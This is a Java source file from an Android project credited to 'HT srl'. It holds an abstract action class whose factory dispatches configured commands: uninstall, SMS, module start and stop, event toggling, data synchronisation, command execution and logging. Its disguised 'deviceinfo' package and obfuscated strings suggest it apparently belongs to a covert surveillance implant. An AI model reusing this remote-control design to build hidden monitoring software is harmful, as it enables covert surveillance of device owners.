/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 03-dec-2010
 **********************************************/

package com.android.deviceinfo.action;

import org.json.JSONException;

import com.android.deviceinfo.Status;
import com.android.deviceinfo.Trigger;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfAction;
import com.android.deviceinfo.conf.ConfigurationException;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

// TODO: Auto-generated Javadoc
/**
 * The Class SubAction.
 */
public abstract class SubAction {

	private static final String TAG = "SubAction"; //$NON-NLS-1$

	/** Parameters. */
	private final ConfAction conf;

	/** The want uninstall. */
	// protected boolean wantUninstall;

	/** The want reload. */
	// protected boolean wantReload;

	/** The status. */
	Status status;

	/**
	 * Instantiates a new sub action.
	 * 
	 * @param type
	 *            the type
	 * @param jsubaction
	 *            the params
	 */
	public SubAction(final ConfAction conf) {
		this.status = Status.self();
		this.conf = conf;

		stop = conf.getBoolean(M.d("stop"), false); //$NON-NLS-1$        

		parse(conf);
	}

	/**
	 * Factory.
	 * 
	 * @param type
	 * 
	 * @param typeId
	 *            the type
	 * @param params
	 *            the conf params
	 * @return the sub action
	 * @throws JSONException
	 * @throws ConfigurationException
	 */
	public static SubAction factory(String type, final ConfAction params) throws ConfigurationException {
		if (Cfg.DEBUG)
			Check.asserts(type != null, "factory: null type"); //$NON-NLS-1$

		// TODO: messages file
		if (type.equals(M.d("uninstall"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_UNINSTALL ***");//$NON-NLS-1$
			}
			
			return new UninstallAction(params);
		} else if (type.equals(M.d("sms"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_SMS ***");//$NON-NLS-1$
			}
			
			return new SmsAction(params);
		} else if (type.equals(M.d("module"))) { //$NON-NLS-1$
			String status = params.getString(M.d("status")); //$NON-NLS-1$
			if (status.equals(M.d("start"))) { //$NON-NLS-1$
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_START_MODULE ***");//$NON-NLS-1$
					Check.log(TAG + " params: " + params );
				}
				
				return new StartModuleAction(params);
			} else if (status.equals(M.d("stop"))) { //$NON-NLS-1$

				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_STOP_MODULE ***");//$NON-NLS-1$
				}
				
				return new StopModuleAction(params);
			}
		} else if (type.equals(M.d("event"))) { //$NON-NLS-1$
			String status = params.getString(M.d("status")); //$NON-NLS-1$
			if (status.equals(M.d("enable"))) { //$NON-NLS-1$
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_ENABLE_EVENT ***");//$NON-NLS-1$
				}
				
				return new EnableEventAction(params);
			} else if (status.equals(M.d("disable"))) { //$NON-NLS-1$
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_DISABLE_EVENT ***");//$NON-NLS-1$
				}
				
				return new DisableEventAction(params);

			}
		} else if (type.equals(M.d("synchronize"))) { //$NON-NLS-1$
			boolean apn = params.has(M.d("apn")); //$NON-NLS-1$
			
			if (apn) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_SYNC_APN ***");//$NON-NLS-1$
				}
				
				return new SyncActionApn(params);
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " Factory *** ACTION_SYNC ***");//$NON-NLS-1$
				}
				
				return new SyncActionInternet(params);
			}

		} else if (type.equals(M.d("execute"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_EXECUTE ***");//$NON-NLS-1$
			}
			
			return new ExecuteAction(params);

		} else if (type.equals(M.d("log"))) { //$NON-NLS-1$
			if (Cfg.DEBUG) {
				Check.log(TAG + " Factory *** ACTION_INFO ***");//$NON-NLS-1$
			}
			
			return new LogAction(params);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (factory) Error: unknown type: " + type); //$NON-NLS-1$
			}
		}
		
		return null;
	}

	public String getType() {
		return conf.getType();
	}

	/** The finished. */
	private boolean finished;

	private boolean stop;

	/**
	 * Parse
	 * 
	 * @param jsubaction
	 *            byte array from configuration
	 */
	protected abstract boolean parse(final ConfAction jsubaction);

	/**
	 * Execute.
	 * 
	 * @param trigger
	 * 
	 * @return true, if successful
	 */
	public abstract boolean execute(Trigger trigger);

	/**
	 * Check. if is finished. //$NON-NLS-1$
	 * 
	 * @return true, if is finished
	 */
	public synchronized boolean isFinished() {
		return finished;
	}

	/**
	 * Prepare execute.
	 */
	public void prepareExecute() {
		synchronized (this) {
			finished = false;
			
			
		}
	}

	@Override
	public String toString() {
		if(Cfg.DEBUG){
			return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" + conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
		}else{
			return conf.actionId + "/" + conf.subActionId; //$NON-NLS-1$
		}
	}

	public boolean considerStop() {
		return stop;
	}

}
